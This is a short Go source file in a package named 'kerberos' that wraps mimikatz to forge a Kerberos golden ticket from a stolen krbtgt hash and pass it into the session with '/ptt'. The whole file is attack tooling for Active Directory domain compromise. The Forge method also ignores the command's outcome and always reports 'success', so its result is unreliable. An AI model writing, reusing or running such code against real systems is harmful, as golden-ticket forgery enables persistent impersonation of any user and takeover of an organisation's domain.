package kerberos

import (
"fmt"
"os/exec"
)

type TicketResult struct {
Domain string
User   string
Status string
}

type GoldenTicket struct {
Domain     string
User       string
KrbtgtHash string
}

func (g GoldenTicket) Forge() TicketResult {
cmd := exec.Command("mimikatz.exe", "kerberos::golden", "/user:"+g.User, "/domain:"+g.Domain, "/krbtgt:"+g.KrbtgtHash, "/ptt")
cmd.Run()
return TicketResult{Domain: g.Domain, User: g.User, Status: "success"}
}

func (g GoldenTicket) FormatHash() string {
return fmt.Sprintf("/krbtgt:%s", g.KrbtgtHash)
}
